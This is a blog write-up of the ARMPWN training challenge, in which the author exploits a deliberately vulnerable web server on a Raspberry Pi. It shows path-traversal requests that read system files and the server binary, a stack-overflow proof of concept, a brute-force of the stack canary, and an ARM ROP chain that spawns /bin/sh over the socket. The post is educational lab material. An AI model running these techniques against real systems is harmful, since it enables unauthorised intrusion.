<!doctype html><html lang=en><head><meta charset=utf-8><meta content="width=device-width,initial-scale=1,shrink-to-fit=no" name=viewport><meta content=BlahCats name=author><meta content="Tales of a binary encoded life..." name=description><meta prefix="og: http://ogp.me/ns#" content=BlahCats property=og:site_name><meta prefix="og: http://ogp.me/ns#" content=blog property=og:type><meta content="ARMPWN challenge write-up" prefix="og: http://ogp.me/ns#" property=og:title><meta content="ARMPWN challenge write-up - by hugsy" prefix="og: http://ogp.me/ns#" property=og:description><meta prefix="og: http://ogp.me/ns#" content=en_US property=og:locale><meta prefix="og: http://ogp.me/ns#" content=https://blahcat.github.io/2016-06-13-armpwn-challenge property=og:url><meta prefix="og: http://ogp.me/ns#" content=https://blahcat.github.io/img/blog-cover.png property=og:image><meta content=summary_large_image name=twitter:card><meta content=@ctf_blahcat name=twitter:site><meta content=BlahCats name=twitter:title><meta content="ARMPWN challenge write-up - by hugsy" name=twitter:description><meta content=https://blahcat.github.io/2016-06-13-armpwn-challenge name=twitter:url><meta content=https://blahcat.github.io/img/blog-cover.png name=twitter:image:src><script type=application/ld+json>
    {
      "@context" : "http://schema.org",
      "@type" : "Website",
      "name": " BlahCats",
      "url" : "https://blahcat.github.io/2016-06-13-armpwn-challenge",
      
      "image": https://blahcat.github.io/img/blog-cover.png",
      
      
      "description": ARMPWN challenge write-up - by hugsy",
      
    }
    </script><title>
  ARMPWN challenge write-up
</title><link href=https://blahcat.github.io/img/favicon.ico rel=icon type=image/x-icon><link href=https://blahcat.github.io/css/bootstrap.min.css rel=stylesheet><link href=" https://blahcat.github.io/css/all.min.css" rel=" stylesheet"><link href="https://fonts.googleapis.com/css?family=Roboto" rel=stylesheet><link href="https://fonts.googleapis.com/css?family=Lora:400,700,400italic,700italic" rel=stylesheet><link href="https://fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800" rel=stylesheet><link href="https://fonts.googleapis.com/css?family=Montserrat:400,300" rel=stylesheet><link href="https://fonts.googleapis.com/css?family=Lato" -- <!-- custom for rel=stylesheet styles template this><link href=https://blahcat.github.io/css/clean-blog.css rel=stylesheet><link href=https://blahcat.github.io/css/overrides.css rel=stylesheet><link integrity="sha512-SnH5WK+bZxgPHs44uWIX+LLJAJ9/2PkPKZ5QiAj6Ta86w+fsb2TkcmfRyVX3pBnMFcV7oQPJkl9QevSCWr3W6A==" crossorigin href=https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.2/css/all.min.css referrerpolicy=no-referrer rel=stylesheet><body><nav class="navbar navbar-expand-lg navbar-light fixed-top" id=mainNav><div class=container><a class=navbar-brand href=https://blahcat.github.io>BlahCats Blog</a><button aria-label="Toggle navigation" class="navbar-toggler navbar-toggler-right" aria-controls=navbarResponsive aria-expanded=false data-target=#navbarResponsive data-toggle=collapse type=button>Menu <i class="fas fa-bars"></i></button><div class="collapse navbar-collapse" id=navbarResponsive><ul class="navbar-nav ml-auto"><li class=nav-item><a class=nav-link href=https://blahcat.github.io>Home</a><li class=nav-item><a class=nav-link href=https://blahcat.github.io/series>Series</a><li class=nav-item><a class=nav-link href=https://blahcat.github.io/notes>Notes</a><li class=nav-item><a class=nav-link href=https://blahcat.github.io/about>About</a><li class=nav-item><a class=nav-link href=https://blahcat.github.io/qemu>Qemu VMs</a></ul></div></div></nav><header class=masthead style=background-image:url(https://blahcat.github.io/img/blog-cover.png)><div class=overlay></div><div class=container><div class=row><div class="col-lg-8 col-md-10 mx-auto"><div class=post-heading><h1>ARMPWN challenge write-up</h1><span class=meta> <b> • <a href=/author/hugsy>hugsy</a> • </b> 13 June 2016 <br> <br> <i>Reading time: 10 min</i> </span></div></div></div></div></header><article><article class=post><div class=container><div class=row><div class="col-lg-8 col-md-10 mx-auto"><h1 id=info>Info</h1><p>A few weeks ago, I came across a GitHub repository created by <a class="fab fa-twitter" href=https://twitter.com/5aelo target=_blank> <code>@5aelo</code> </a> for people wanting to have a bit of ARM fun. I had recently spent some time adding new features and perfectionning old ones to my exploit helper for GDB, <a rel="noopener nofollow noreferrer" href=https://github.com/hugsy/gef.git target=_blank><code>gef</code></a> and I saw there a perfect practice case. On top of that, I had nothing better to do yesterday ☺<p>This challenge was really fun, and made so much easier thanks to <code>gef</code> especially to defeat real life protections (NX/ASLR/PIC/Canary), and on a non-x86 architecture (Intel is so ’90). This is mostly why I’m doing this write-up, but feel curious and try it by yourself. Fun time ahead ☺<p><a rel="noopener nofollow noreferrer" href=https://github.com/saelo/armpwn/blob/master/README.md#how-to-use-this-repository target=_blank>5aelo</a> suggests a few approaches to tackle it, I decided to go “Total Pwn”, meaning discovering everything about the binary. There is also links to Qemu images ready-to-use, for people who don’t have (or don’t want to use) a RPI.<p><strong>Challenge</strong>: Try to go from anonymous access to remote code execution on the <code>websrv</code> process running on a Raspberry-Pi <code>rpi2-1:80</code>.<pre class=language-bash data-lang=bash style=color:#c0c5ce;background-color:#2b303b><code class=language-bash data-lang=bash><span style=color:#bf616a>pi@rpi2-1 ~</span><span> $ uname</span><span style=color:#bf616a> -a
</span><span style=color:#bf616a>Linux</span><span> rpi2-1 4.4.11-v7+ </span><span style=color:#65737e>#888 SMP Mon May 23 20:10:33 BST 2016 armv7l GNU/Linux
</span><span style=color:#bf616a>pi@rpi2-1 ~</span><span> $ ss</span><span style=color:#bf616a> -lntp
</span><span style=color:#bf616a>State</span><span>       Recv-Q Send-Q          Local Address:Port                 Peer Address:Port
</span><span style=color:#bf616a>LISTEN</span><span>      0      0                           *:80                              *:*
</span><span style=color:#bf616a>LISTEN</span><span>      0      0                           *:22                              *:*
</span></code></pre><p>Let’s get it started!<p><strong>Note</strong>: since a solution to the challenge is available within the GitHub repo, I don’t feel too bad publishing my own.<h1 id=web-application-attack>Web Application attack</h1><p>Just like for a regular pentest, all we know here is that the port 80/tcp is open, and accessing to <code>/</code> redirect us to a page to turn on and off a LED (supposed connected to the GPIO on our RaspberryPi). Not exactly fancy… By sending a simple <a rel="noopener nofollow noreferrer" href=https://nmap.org/ncat target=_blank><code>ncat</code></a> request, things get suddenly more interesting: <a href=https://i.imgur.com/Zw0BH8c.png target=_blank> <img alt=toadd src=https://i.imgur.com/Zw0BH8c.png title=toadd width=100%> </a><p><em><strong>Hint</strong>:</em> Other tools were tested and failed. The reason for that is that they parse and resolve the URL <em>before</em> sending it. So if I try to fuzz <code>http://foo/../../../another/path</code>, the tools will automatically solve it as <code>http://foo/another/path</code> even before the request leaves my computer. This is (IMHO) a bad feature for pentesters/bug hunters as it may lead to missing out some easy vulns (just like here!). So again, only one rule apply: trust only your own tools!<p>Back to business: we can now read files remotely like <code>/etc/passwd</code> but we can also retrieve the binary using <code>/proc/self/exe</code><pre class=language-bash data-lang=bash style=color:#c0c5ce;background-color:#2b303b><code class=language-bash data-lang=bash><span style=color:#bf616a>$</span><span> python</span><span style=color:#bf616a> -c </span><span>'</span><span style=color:#a3be8c>import requests;print requests.get("http://"+"rpi2-1/../../../../proc/self/cmdline").text</span><span>'
</span><span style=color:#bf616a>HTTP/1.1</span><span> 200 OK
</span><span style=color:#bf616a>Content-Type:</span><span> text/html
</span><span style=color:#bf616a>Content-Length:</span><span> 0
</span><span>
</span><span style=color:#bf616a>/home/pi/armpwn/bin/websrv
</span><span style=color:#bf616a>$</span><span> python</span><span style=color:#bf616a> -c </span><span>'</span><span style=color:#a3be8c>import requests;print
</span><span style=color:#a3be8c>requests.get("http://"+"rpi2-1/../../../../proc/self/exe").text</span><span>' > websrv
</span><span style=color:#bf616a>$</span><span> file websrv
</span><span style=color:#bf616a>websrv:</span><span> ELF 32-bit LSB shared object, ARM, EABI5 version 1 (SYSV)</span><span style=color:#bf616a>,</span><span> dynamically linked, interpreter /lib/ld-linux-armhf.so.3, for GNU/Linux 2.6.26, BuildID</span><span style=color:#b48ead>[</span><span>sha1</span><span style=color:#b48ead>]</span><span>=5b3aa53d30579a7f7f0b9cb1eedfb06b1884e112, stripped
</span></code></pre><p>Much better, we have the binary to analyze! This part was pretty straight-forward, let’s move on.<p>Next, the binary analysis.<h1 id=reversing-the-binary>Reversing the binary</h1><p>We can use <code>IDA</code> to start with the static analysis. After a quick examination, the overall structure reveals itself quite clearly. The behaviour for the main process can be described with this pseudo-code:<pre class=language-c data-lang=c style=color:#c0c5ce;background-color:#2b303b><code class=language-c data-lang=c><span style=color:#bf616a>create_bind_socket</span><span>();
</span><span style=color:#bf616a>bind</span><span>();
</span><span style=color:#bf616a>listen</span><span>();
</span><span style=color:#b48ead>while</span><span>(</span><span style=color:#d08770>1</span><span>){
</span><span>    fd = </span><span style=color:#bf616a>accept</span><span>();
</span><span>    </span><span style=color:#b48ead>if</span><span>( </span><span style=color:#bf616a>fork</span><span>() > </span><span style=color:#d08770>0</span><span>){          </span><span style=color:#65737e>// child process
</span><span>        </span><span style=color:#bf616a>setup_alarm</span><span>();
</span><span>        </span><span style=color:#bf616a>treat_requests</span><span>(fd);
</span><span>        </span><span style=color:#bf616a>close_socket</span><span>(fd);
</span><span>        </span><span style=color:#96b5b4>exit</span><span>(</span><span style=color:#d08770>0</span><span>);
</span><span>    }
</span><span>    </span><span style=color:#bf616a>close_socket</span><span>(fd);
</span><span>}
</span></code></pre><p>The use of <code>fork()</code> is a good news as we know that we will be able to reuse any address we leaked.<p>The forked process which executes <code>treat_requests()</code> is more interesting: the function starts by reading 0x800 bytes and look for the marker of end for HTTP headers (<code>CRLF</code>*2). If not found, it will keep iterating through the loop. Otherwise, the block read will search for the header <code>Content-Length</code> and if found, will call <code>strtol()</code> on it to convert the pointer into a long integer (let’s call it <code>N</code>). <a href=https://i.imgur.com/awC1RfU.png target=_blank> <img alt=image_alt src=https://i.imgur.com/awC1RfU.png title=image_alt width=100%> </a><p>This value will be used to call read <code>N</code> bytes from the socket and stored in local buffer of size 0xffc. The overflow comes clear as we controlled the size of the <code>Content-Length</code> header, we can forged an HTTP request whose body is big enough to corrupt the memory.<pre class=language-asm data-lang=asm style=color:#c0c5ce;background-color:#2b303b><code class=language-asm data-lang=asm><span style=color:#8fa1b3>.text:000015DC </span><span style=color:#b48ead>MOV     </span><span style=color:#8fa1b3>R1</span><span>, </span><span style=color:#8fa1b3>#</span><span style=color:#d08770>0</span><span style=color:#65737e>          ; endptr
</span><span style=color:#8fa1b3>.text:000015E0 </span><span style=color:#b48ead>MOV     </span><span style=color:#8fa1b3>R2</span><span>, </span><span style=color:#8fa1b3>#</span><span style=color:#d08770>10</span><span style=color:#65737e>         ; base
</span><span style=color:#8fa1b3>.text:000015E4 </span><span style=color:#bf616a>BL      </span><span style=color:#8fa1b3>strtol
</span><span style=color:#8fa1b3>.text:000015E8 SUBS    R4</span><span>, </span><span style=color:#8fa1b3>R0</span><span>, </span><span style=color:#d08770>0</span><span style=color:#65737e>       ; N=$r4=strtol(hdrs["Content-Length"), 10)
</span><span style=color:#96b5b4>[...]
</span><span style=color:#8fa1b3>.text:</span><span style=color:#d08770>00001608 </span><span style=color:#b48ead>MOV     </span><span style=color:#8fa1b3>R0</span><span>, </span><span style=color:#bf616a>R9</span><span style=color:#65737e>          ; fd
</span><span style=color:#8fa1b3>.text:0000160C </span><span style=color:#b48ead>MOV     </span><span style=color:#8fa1b3>R1</span><span>, </span><span style=color:#8fa1b3>R6</span><span style=color:#65737e>          ; stack_buffer
</span><span style=color:#8fa1b3>.text:</span><span style=color:#d08770>00001610 </span><span style=color:#b48ead>MOV     </span><span style=color:#8fa1b3>R2</span><span>, </span><span style=color:#8fa1b3>R4</span><span style=color:#65737e>          ; N
</span><span style=color:#8fa1b3>.text:</span><span style=color:#d08770>00001614 </span><span style=color:#b48ead>MOV     </span><span style=color:#8fa1b3>R3</span><span>, </span><span style=color:#bf616a>R10</span><span style=color:#65737e>         ; flags
</span><span style=color:#8fa1b3>.text:</span><span style=color:#d08770>00001618 </span><span style=color:#bf616a>BL      </span><span style=color:#8fa1b3>recv
</span></code></pre><p>This is quite easy to PoC, simply by sending a large buffer:<pre class=language-python data-lang=python style=color:#c0c5ce;background-color:#2b303b><code class=language-python data-lang=python><span style=color:#b48ead>from </span><span>pwn </span><span style=color:#b48ead>import </span><span style=color:#d08770>*
</span><span>
</span><span>r = </span><span style=color:#bf616a>remote</span><span>("</span><span style=color:#a3be8c>rpi2-1</span><span>", </span><span style=color:#d08770>80</span><span>)
</span><span>crlf = "</span><span style=color:#96b5b4>\r\n</span><span>"
</span><span>head = ["</span><span style=color:#a3be8c>GET . HTTP/1.1</span><span>",
</span><span>        "</span><span style=color:#a3be8c>Host: rpi2-1</span><span>",
</span><span>        "</span><span style=color:#a3be8c>Content-Length: 10000</span><span>"]
</span><span>
</span><span>log.</span><span style=color:#bf616a>info</span><span>("</span><span style=color:#a3be8c>sending header</span><span>")
</span><span>r.</span><span style=color:#bf616a>send</span><span>(crlf.</span><span style=color:#bf616a>join</span><span>(head) + crlf*</span><span style=color:#d08770>2</span><span>)
</span><span>
</span><span>log.</span><span style=color:#bf616a>info</span><span>("</span><span style=color:#a3be8c>sending body</span><span>")
</span><span>r.</span><span style=color:#bf616a>send</span><span>("</span><span style=color:#a3be8c>A</span><span>"*</span><span style=color:#d08770>10000</span><span>)
</span></code></pre><p>Run it and see the crash.<pre class=language-bash data-lang=bash style=color:#c0c5ce;background-color:#2b303b><code class=language-bash data-lang=bash><span style=color:#bf616a>$</span><span> py exploit.py
</span><span style=color:#bf616a>[+]</span><span> Opening connection to rpi2-1 on port 80: Done
</span><span style=color:#bf616a>[+]</span><span> sending header
</span><span style=color:#bf616a>[+]</span><span> sending body
</span><span style=color:#bf616a>[*]</span><span> Closed connection to rpi2-1 port 80
</span></code></pre><p>And checking at our process, we can see:<pre class=language-bash data-lang=bash style=color:#c0c5ce;background-color:#2b303b><code class=language-bash data-lang=bash><span style=color:#bf616a>New</span><span> connection from 192.168.69.134 on port 49539
</span><span style=color:#bf616a>192.168.69.134:49539</span><span> request for file '</span><span style=color:#a3be8c>index.html</span><span>'
</span><span style=color:#bf616a>***</span><span> stack smashing detected ***: /home/pi/armpwn/bin/websrv terminated
</span></code></pre><p>So (at least) one of the vulnerabilities is a standard stack overflow. We can confirm that by visualizing the execution flow with <code>GDB</code> debugger with <code>gef</code> extension with <a rel="noopener nofollow noreferrer" href=https://hugsy.github.io/gef/commands/trace-run/ target=_blank><code>trace-run</code></a>.<pre class=language-bash data-lang=bash style=color:#c0c5ce;background-color:#2b303b><code class=language-bash data-lang=bash><span style=color:#bf616a>gef➤</span><span>  ps</span><span style=color:#bf616a> -sa</span><span> websrv
</span><span style=color:#bf616a>[+]</span><span> Attaching to process='</span><span style=color:#a3be8c>/home/pi/armpwn/bin/websrv</span><span>' pid=9975
</span><span style=color:#bf616a>[...]
</span><span style=color:#bf616a>gef➤</span><span>  set follow-fork-mode child
</span><span style=color:#bf616a>gef➤</span><span>  bp *0x54aef4a8
</span><span style=color:#bf616a>Breakpoint</span><span> 1 at 0x54aef4a8
</span><span style=color:#bf616a>gef➤</span><span>  run
</span><span style=color:#bf616a>[...</span><span> execute the PoC ...]
</span><span style=color:#bf616a>gef➤</span><span>  trace-run 0x54aef6b0
</span><span style=color:#bf616a>[+]</span><span> Tracing from 0x54aef4a8 to 0x54aef6b0 (max depth=1)
</span><span style=color:#bf616a>[wait</span><span> for it...]
</span><span style=color:#bf616a>[+]</span><span> Done, logfile stored as '</span><span style=color:#a3be8c>./gef-trace-0x54aef4a8-0x54aef6b0.txt</span><span>'
</span><span style=color:#bf616a>[+]</span><span> Hint: import logfile with `</span><span style=color:#bf616a>ida_color_gdb_trace.py</span><span>` script in IDA to visualize path
</span></code></pre><p>By using the <a rel="noopener nofollow noreferrer" href=https://github.com/hugsy/stuff/blob/master/ida_scripts/ida_color_gdb_trace.py target=_blank><code>ida_color_gdb_trace.py</code></a> script, we can visualize in <code>IDA</code> the execution flow, that confirms our PoC and highlights all the addresses in <code>$pc</code> executed.</p><a href=https://i.imgur.com/NXc221Q.png target=_blank> <img alt=ida-graph-trace.png src=https://i.imgur.com/NXc221Q.png title=ida-graph-trace.png width=100%> </a><p>Using the <code>pattern</code> commands of <code>gef</code> we find out that we start overwriting the canary after sending 4042 bytes.<h1 id=exploitation>Exploitation</h1><h3 id=binary-protections>Binary protections</h3><p>Even though we have a memory corruption, this is not enough since we have plenty of protection mechanism to defeat first ☹<pre class=language-txt data-lang=txt style=color:#c0c5ce;background-color:#2b303b><code class=language-txt data-lang=txt><span>gef➤  checksec
</span><span>[+] checksec for '/home/pi/armpwn/bin/websrv'
</span><span>Canary:                                           Yes
</span><span>NX Support:                                       Yes
</span><span>PIE Support:                                      Yes
</span><span>No RPATH:                                         Yes
</span><span>No RUNPATH:                                       Yes
</span><span>Partial RelRO:                                    Yes
</span><span>Full RelRO:                                       Yes
</span></code></pre><p>And on top of all those, ASLR is on. Given the target is 32 bits, brute-force is a realistic approach, although inelegant. One (or more) memory leak(s) can defeat PIC & ASLR, let’s look for those first.<p>Fortunately, thanks to the Step-1 (<em>Web Application attack</em>), we know that we can dump the memory layout of the process (by reading the <code>/proc/self/maps</code>), and also download a copy of the libc so we can call <code>execve()</code>.<p><strong>Note</strong>: the stack is actually RWX but I chose not to use that.<pre class=language-bash data-lang=bash style=color:#c0c5ce;background-color:#2b303b><code class=language-bash data-lang=bash><span style=color:#bf616a>gef➤</span><span>  xinfo execve
</span><span style=color:#bf616a>──────────────────────────────────────────[</span><span> xinfo: execve ]──────────────────────────────────────────
</span><span style=color:#bf616a>Found</span><span> 0x76e3ef80
</span><span style=color:#bf616a>Page:</span><span> 0x76e44000 → 0x76f6b000 (size=0x127000)
</span><span style=color:#bf616a>Permissions:</span><span> r-x
</span><span style=color:#bf616a>Pathname:</span><span> /lib/arm-linux-gnueabihf/libc-2.22.so
</span><span style=color:#bf616a>Offset</span><span> (from page)</span><span style=color:#96b5b4>:</span><span> +0x9bf80
</span><span style=color:#bf616a>Inode:</span><span> 17992
</span><span style=color:#bf616a>Segment:</span><span> .text (0x76e59e20-0x76f4b200)
</span><span>
</span><span style=color:#bf616a>gef➤</span><span>  grep /bin/sh
</span><span style=color:#bf616a>[+]</span><span> Searching '</span><span style=color:#a3be8c>/bin/sh</span><span>' in memory
</span><span style=color:#bf616a>0x76f5df08-0x76f5df0f</span><span> →  "</span><span style=color:#a3be8c>/bin/sh</span><span>"
</span></code></pre><p>So we have <code>execve_addr = libc_base + 0x9bf80</code> and also `binsh_str = libc_base<ul><li>0x119f08<code>. We can build the call </code>execve(‘/bin/sh’, 0, 0)`.</ul><h3 id=leaking-the-canary>Leaking the canary</h3><p>Last thing we need to build a full exploit is a way to leak/brute-force the canary.<p>In the pseudo-code earlier, we found that the <code>main</code> process was calling a function that we named <code>treat_requests()</code>. IDA shows us that this function is actually a loop to process one or more valid HTTP requests on the same socket.</p><a href=https://i.imgur.com/2DnSsUl.png target=_blank> <img alt=ida-screen-treat-requests src=https://i.imgur.com/2DnSsUl.png title=ida-screen-treat-requests width=100%> </a><p>Which looks something like:<pre class=language-c data-lang=c style=color:#c0c5ce;background-color:#2b303b><code class=language-c data-lang=c><span style=color:#b48ead>while </span><span>(</span><span style=color:#d08770>1</span><span>){
</span><span>  retcode = </span><span style=color:#bf616a>process_http_request</span><span>(fd);
</span><span>  </span><span style=color:#b48ead>if </span><span>(retcode < </span><span style=color:#d08770>0</span><span>)
</span><span>      </span><span style=color:#b48ead>break</span><span>;
</span><span>}
</span></code></pre><p>This gives us a perfect way to leak the canary:<ul><li>try to brute-force byte 0 of the canary, and then send another valid (dummy) HTTP request.<li>if the byte tested is incorrect (i.e. different from the canary), the process will die, closing the socket, that we can detect on our end by an EOFError.<li>otherwise, the byte 0 is valid, proceed with byte 1</ul><p>Iterating using this method for the 4 bytes allows us to leak the canary:<pre class=language-bash data-lang=bash style=color:#c0c5ce;background-color:#2b303b><code class=language-bash data-lang=bash><span style=color:#bf616a>~</span><span> $ py exploit.py
</span><span style=color:#bf616a>[*]</span><span> Leaking canary
</span><span style=color:#bf616a>Found</span><span> valid byte '</span><span style=color:#a3be8c>0</span><span>'
</span><span style=color:#bf616a>Found</span><span> valid byte '</span><span style=color:#a3be8c>e6</span><span>'
</span><span style=color:#bf616a>Found</span><span> valid byte '</span><span style=color:#a3be8c>74</span><span>'
</span><span style=color:#bf616a>Found</span><span> valid byte '</span><span style=color:#a3be8c>60</span><span>'
</span><span style=color:#bf616a>Canary</span><span> is 0x6074e600
</span></code></pre><h3 id=building-the-rop-sequence>Building the ROP sequence</h3><p>Almost there! We have bypassed ASLR, PIC, NX and SSP. In x86, we would be just done. ARM however uses one register (saved on stack) to save the return address (called the Link Register) along with all the non-volatile registers that must be preserved across functions calls.<p>IDA shows that the <code>parse_request()</code> function finishes its execution by restoring the context of the calling function:<pre style=color:#c0c5ce;background-color:#2b303b><code><span>.text:000016D0 loc_16D0
</span><span>.text:000016D0 ADD     SP, SP, #0xC
</span><span>.text:000016D4 ADD     SP, SP, #0x1000
</span><span>.text:000016D8 LDMFD   SP!, {R4-R11,PC}
</span></code></pre><p>As we can see $pc is restored from the stack right after some registers. Since everything is in the stack on which we have total control over, when we call <code>execve()</code>, the execution flow would expected that the pointer to our string to execute be in $r0 as per ARM calling convention. So we need an extra gadgets to pop the <code>/bin/sh</code> address directly into $r0. <code>gef</code> module <code>ropgadget</code> will work perfectly for this. Finding suitable gadgets is a little harder on ARM than x86 as you find hardly instructions to pop directly into your argument registers (for example <code>pop{r0}</code>, or <code>pop{r1}</code>) So you’ll need to chain them adequately, bearing in mind which registers will be affected the gadgets (for example <code>blx</code> will also affect the Link Register which may be indesirable). Building the ROP sequence for this binary is not hard, so I built a helper function:<pre class=language-python data-lang=python style=color:#c0c5ce;background-color:#2b303b><code class=language-python data-lang=python><span style=color:#b48ead>def </span><span style=color:#8fa1b3>rop_call</span><span>(</span><span style=color:#bf616a>func</span><span>, </span><span style=color:#bf616a>arg1</span><span>=</span><span style=color:#d08770>0</span><span>, </span><span style=color:#bf616a>arg2</span><span>=</span><span style=color:#d08770>0</span><span>, </span><span style=color:#bf616a>arg3</span><span>=</span><span style=color:#d08770>0</span><span>):
</span><span>     p = </span><span style=color:#bf616a>p32</span><span>(exe+</span><span style=color:#d08770>0x0c80</span><span>)      </span><span style=color:#65737e># pop {r3, pc}
</span><span>     p+= </span><span style=color:#bf616a>p32</span><span>(exe+</span><span style=color:#d08770>0x0c80</span><span>)      </span><span style=color:#65737e># pop {r3, pc}
</span><span>     p+= </span><span style=color:#bf616a>p32</span><span>(exe+</span><span style=color:#d08770>0x16d8</span><span>)      </span><span style=color:#65737e># ldmfd sp!, {r4-r11,pc}
</span><span>     p+= "</span><span style=color:#a3be8c>AAAA</span><span>"               </span><span style=color:#65737e># r4
</span><span>     p+= "</span><span style=color:#a3be8c>AAAA</span><span>"               </span><span style=color:#65737e># r5
</span><span>     p+= </span><span style=color:#bf616a>p32</span><span>(arg1)            </span><span style=color:#65737e># r6
</span><span>     p+= </span><span style=color:#bf616a>p32</span><span>(arg2)            </span><span style=color:#65737e># r7
</span><span>     p+= </span><span style=color:#bf616a>p32</span><span>(arg3)            </span><span style=color:#65737e># r8
</span><span>     p+= "</span><span style=color:#a3be8c>AAAA</span><span>"               </span><span style=color:#65737e># r9
</span><span>     p+= "</span><span style=color:#a3be8c>AAAA</span><span>"               </span><span style=color:#65737e># r10
</span><span>     p+= "</span><span style=color:#a3be8c>AAAA</span><span>"               </span><span style=color:#65737e># r11
</span><span>     p+= </span><span style=color:#bf616a>p32</span><span>(exe+</span><span style=color:#d08770>0x1abc</span><span>)      </span><span style=color:#65737e># mov r0, r6 ; mov r1, r7 ; mov r2, r8 ; add r4, r4, #1 ; blx r3
</span><span>     p+= </span><span style=color:#bf616a>p32</span><span>(func)
</span><span>     p+= </span><span style=color:#bf616a>p32</span><span>(libc+</span><span style=color:#d08770>0x71bc4</span><span>)    </span><span style=color:#65737e># pop {lr} ; bx r3
</span><span>     p+= </span><span style=color:#bf616a>p32</span><span>(libc+</span><span style=color:#d08770>0xdd474</span><span>)    </span><span style=color:#65737e># pop {r4, pc}
</span><span>     p+= "</span><span style=color:#a3be8c>AAAA</span><span>"
</span><span>     </span><span style=color:#b48ead>return </span><span>p
</span></code></pre><p>Which makes the final payload quite clear:<pre class=language-python data-lang=python style=color:#c0c5ce;background-color:#2b303b><code class=language-python data-lang=python><span>saved_regs  = "</span><span style=color:#a3be8c>BBBB</span><span>"*</span><span style=color:#d08770>9
</span><span>payload = "</span><span style=color:#a3be8c>A</span><span>"*</span><span style=color:#d08770>4042 </span><span>+ canary + saved_regs
</span><span>payload+= </span><span style=color:#bf616a>rop_call</span><span>(dup2, </span><span style=color:#d08770>4</span><span>, </span><span style=color:#d08770>2</span><span>)
</span><span>payload+= </span><span style=color:#bf616a>rop_call</span><span>(dup2, </span><span style=color:#d08770>4</span><span>, </span><span style=color:#d08770>1</span><span>)
</span><span>payload+= </span><span style=color:#bf616a>rop_call</span><span>(dup2, </span><span style=color:#d08770>4</span><span>, </span><span style=color:#d08770>0</span><span>)
</span><span>payload+= </span><span style=color:#bf616a>rop_call</span><span>(execve, binsh, </span><span style=color:#d08770>0</span><span>, </span><span style=color:#d08770>0</span><span>)
</span></code></pre><p>You may notice that I also call <code>dup2()</code> thrice to redirect stdin/stdout/stderr directly to the socket (which presumably holds the file description #4).<p>Now run it, enjoy the shell and a good coffee ☕</p><a href=https://i.imgur.com/uzlxQx8.png target=_blank> <img alt=armpwn src=https://i.imgur.com/uzlxQx8.png title=armpwn width=100%> </a><p>The complete exploit code can be found <a rel="noopener nofollow noreferrer" href=https://gist.github.com/hugsy/45d1c23f33f09126fe0838c1fe057687 target=_blank>here</a>.<h1 id=final-notes>Final notes</h1><p>Thanks to <a class="fab fa-twitter" href=https://twitter.com/5aelo target=_blank> <code>@5aelo</code> </a> for this fun challenge. It is a good way to get acquainted with ARM exploitation, and is one of the reason why I build <a rel="noopener nofollow noreferrer" href=https://github.com/hugsy/gef.git target=_blank><code>gef</code></a> in a first place, i.e. having a good exploitation environment over <code>gdb</code> on any architecture it is supporting.<aside class=post-tags><p>Categories: <a href=https://blahcat.github.io/categories/ctf/>#ctf</a> <a href=https://blahcat.github.io/categories/research/>#research</a><p>Tags: <a href=https://blahcat.github.io/tags/pwn/>#pwn</a> <a href=https://blahcat.github.io/tags/arm/>#arm</a> <a href=https://blahcat.github.io/tags/gef/>#gef</a> <a href=https://blahcat.github.io/tags/gdb/>#gdb</a> <a href=https://blahcat.github.io/tags/ida/>#ida</a> <a href=https://blahcat.github.io/tags/rop/>#rop</a> <a href=https://blahcat.github.io/tags/pwntools/>#pwntools</a></aside><aside class=post-discussion>Join the Discussion on <a href="https://github.com/blahcat/blahcat.github.io/discussions?discussions_q=ARMPWN challenge write-up" target=_blank> <i class="fab fa-github fa-lg"></i> GitHub </a></aside><aside class=post-nav><div class=container><div class=row><div class=col><b>Next:</b><br><a class=post-nav-prev href=https://blahcat.github.io/2016-08-27-ruxmon-16-making-gdb-great-again/> <section class=post-nav-teaser><b class=post-nav-title>Ruxmon 08/2016 - Making GDB great again</b><p class=post-nav-excerpt>Ruxmon August 2016: Making GDB great again I did a small presentation last …</section> </a></div><div class=col><b>Previous:</b><br><a class=post-nav-next href=https://blahcat.github.io/2016-05-24-defcon-ctf-2016-heapfun4u/> <section class=post-nav-teaser><b class=post-nav-title>DEFCON CTF 2016 - heapfun4u</b><p class=post-nav-excerpt>Info The vulnerable file was given with the following instructions: Guess w…</section> </a></div></div></div></aside></div></div><hr><footer><div class=container><div class=row><div class="col-lg-8 col-md-10 mx-auto"><ul class="list-inline text-center"><li class=list-inline-item><a href=https://blahcat.github.io/atom.xml> <span class="fa-stack fa-lg"> <i class="fas fa-circle fa-stack-2x"></i> <i class="fas fa-rss fa-stack-1x fa-inverse"></i> </span> </a><li class=list-inline-item><a href=https://twitter.com/ctf_blahcat> <span class="fa-stack fa-lg"> <i class="fas fa-circle fa-stack-2x"></i> <i class="fab fa-twitter fa-stack-1x fa-inverse"></i> </span> </a><li class=list-inline-item><a href=https://github.com/blahcat> <span class="fa-stack fa-lg"> <i class="fas fa-circle fa-stack-2x"></i> <i class="fab fa-github fa-stack-1x fa-inverse"></i> </span> </a><li class=list-inline-item><a href=https://www.youtube.com/channel/UCDrgY65mRZWVoMiB5-VMqfg> <span class="fa-stack fa-lg"> <i class="fas fa-circle fa-stack-2x"></i> <i class="fab fa-youtube fa-stack-1x fa-inverse"></i> </span> </a><li class=list-inline-item><a href=https://discord.gg/hSbqxxBgRX> <span class="fa-stack fa-lg"> <i class="fas fa-circle fa-stack-2x"></i> <i class="fab fa-discord fa-stack-1x fa-inverse"></i> </span> </a></ul><p class="copyright text-muted">Made with ❤ with Zola</div></div></div></footer><script src=https://blahcat.github.io/js/jquery.min.js></script><script src=https://blahcat.github.io/js/bootstrap.bundle.min.js></script><script src=https://blahcat.github.io/js/clean-blog.min.js></script><script src=//cdnjs.cloudflare.com/ajax/libs/mermaid/9.1.1/mermaid.min.js></script><div class=mermaidTooltip style=opacity:0></div>